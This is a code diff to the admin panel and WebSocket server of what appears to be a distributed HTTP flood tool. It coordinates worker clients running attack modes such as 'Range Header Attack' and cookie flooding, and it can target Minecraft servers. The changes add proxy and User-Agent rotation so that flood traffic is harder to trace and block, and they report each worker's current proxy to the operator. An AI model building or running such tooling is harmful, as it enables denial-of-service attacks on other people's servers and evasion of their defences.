@@ -119,9 +119,14 @@ const adminHTML = `<!DOCTYPE html>
             font-size: 12px;
             margin: 5px 0;
             color: #aaa;
+            word-break: break-all;
         }
         .worker-stat span {
             color: #fff;
+            font-weight: bold;
+        }
+        .worker-stat.highlight {
+            color: #00ff41;
             font-weight: bold;
         }
         .total-stats {
@@ -386,6 +391,16 @@ const adminHTML = `<!DOCTYPE html>
                 <label style="margin: 0; cursor: pointer;" for="rangeHeader">Range Header Attack</label>
             </div>
             
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="useProxy" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="useProxy">Use Proxies (from proxies.txt)</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="rotateUserAgent" checked style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="rotateUserAgent">Rotate User-Agent (from headers.txt)</label>
+            </div>
+            
             <div class="form-group">
                 <label>POST Data (optional, for POST/PUT requests)</label>
                 <input type="text" id="postData" placeholder='{"key": "value"}' value="">
@@ -468,6 +483,15 @@ const adminHTML = `<!DOCTYPE html>
                     break;
                 case 'worker_stats':
                     updateWorkerStats(data.workerId, data.stats);
+                    // Update worker info if provided
+                    const worker = workers.find(w => w.id === data.workerId);
+                    if (worker) {
+                        if (data.currentUA) worker.currentUA = data.currentUA;
+                        if (data.currentProxy) worker.currentProxy = data.currentProxy;
+                        if (data.uaCount !== undefined) worker.uaCount = data.uaCount;
+                        if (data.proxyCount !== undefined) worker.proxyCount = data.proxyCount;
+                        updateWorkersDisplay();
+                    }
                     break;
                 case 'test_started':
                     document.getElementById('testStatus').textContent = 'RUNNING';
@@ -578,6 +602,8 @@ const adminHTML = `<!DOCTYPE html>
                 randomParams: document.getElementById('randomParams').checked,
                 cookieFlood: document.getElementById('cookieFlood').checked,
                 rangeHeader: document.getElementById('rangeHeader').checked,
+                useProxy: document.getElementById('useProxy').checked,
+                rotateUserAgent: document.getElementById('rotateUserAgent').checked,
                 postData: document.getElementById('postData').value,
                 minecraftPort: isMinecraft ? parseInt(document.getElementById('minecraftPort').value) : 25565
             };
@@ -1082,10 +1108,18 @@ wss.on('connection', (ws) => {
       
       if (data.type === 'stats' && clientInfo.type === 'worker') {
         clientInfo.stats = data.stats;
+        clientInfo.currentUA = data.currentUA || 'Unknown';
+        clientInfo.currentProxy = data.currentProxy || 'Direct';
+        clientInfo.uaCount = data.uaCount || 0;
+        clientInfo.proxyCount = data.proxyCount || 0;
         broadcastToAdmins({
           type: 'worker_stats',
           workerId: clientId,
-          stats: data.stats
+          stats: data.stats,
+          currentUA: data.currentUA,
+          currentProxy: data.currentProxy,
+          uaCount: data.uaCount,
+          proxyCount: data.proxyCount
         });
       }
       
